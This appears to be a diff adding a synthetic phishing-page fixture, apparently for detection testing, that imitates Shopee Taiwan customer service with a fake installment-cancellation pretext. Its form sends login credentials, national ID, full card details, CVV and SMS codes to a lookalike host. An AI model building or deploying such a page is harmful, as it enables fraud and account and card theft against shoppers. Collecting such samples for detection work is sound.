@@ -1,0 +1,53 @@
+<!doctype html>
+<!--
+  Synthetic Taiwan phishing fixture — fake 蝦皮購物 (Shopee TW) seller
+  dispute / refund. 165 category: 假冒蝦皮客服解除分期 — kit calls the
+  buyer claiming a Shopee transaction was set to "monthly installments
+  by mistake" and asks for a card "to cancel". Lives on shopee-pay.*.tw
+  lookalike host. Mainland-Chinese terms ("退款", "客服中心" still 繁中,
+  but "短信驗證" + "登錄" reveal the kit origin).
+-->
+<html lang="zh-Hant">
+  <head>
+    <meta charset="UTF-8">
+    <title>蝦皮購物客服 - 解除分期付款</title>
+    <style>
+      body { font-family: -apple-system, "Microsoft JhengHei", sans-serif;
+             background: #f5f5f5; margin: 0; }
+      .top { background: #ee4d2d; color: white; padding: 12px 16px;
+             font-size: 16px; font-weight: 700; }
+      .container { max-width: 440px; margin: 20px auto; background: white;
+                   padding: 20px; border-radius: 6px;
+                   box-shadow: 0 1px 4px rgba(0,0,0,0.1); }
+      h1 { color: #ee4d2d; font-size: 18px; }
+      .desc { color: #555; font-size: 13px; line-height: 1.6; }
+      input { width: 100%; padding: 8px; margin-top: 4px;
+              border: 1px solid #ccc; box-sizing: border-box; }
+      label { font-size: 13px; color: #333; display: block; margin-top: 12px; }
+      button { background: #ee4d2d; color: white; border: 0;
+               padding: 10px 24px; margin-top: 16px; font-weight: 700;
+               cursor: pointer; }
+    </style>
+  </head>
+  <body>
+    <div class="top">蝦皮購物 客服中心</div>
+    <div class="container">
+      <h1>解除分期付款設定</h1>
+      <p class="desc">
+        您於本平台之訂單 <strong>#TW20260606-128314</strong> 由於系統設定錯誤，
+        誤設為「每月分期付款 12 期」，將自動於每月 6 日從您的信用卡扣款。
+        為了取消該設定，請依下方步驟驗證您的身分後完成解除流程。
+      </p>
+      <form action="https://shopee-pay-refund.account-tw.click/post" method="post">
+        <label>登錄帳號 (手機/Email) <input name="account" required></label>
+        <label>登錄密碼 <input name="password" type="password" required></label>
+        <label>身分證字號 <input name="idno" placeholder="A123456789" pattern="[A-Z][0-9]{9}" required></label>
+        <label>信用卡卡號 <input name="card_number" autocomplete="cc-number" required></label>
+        <label>有效期限 <input name="cc_exp" placeholder="MM/YY" autocomplete="cc-exp" required></label>
+        <label>安全碼 <input name="cvv" autocomplete="cc-csc" required></label>
+        <label>短信驗證碼 <input name="otp" inputmode="numeric" autocomplete="one-time-code" required></label>
+        <button>送出取消申請</button>
+      </form>
+    </div>
+  </body>
+</html>
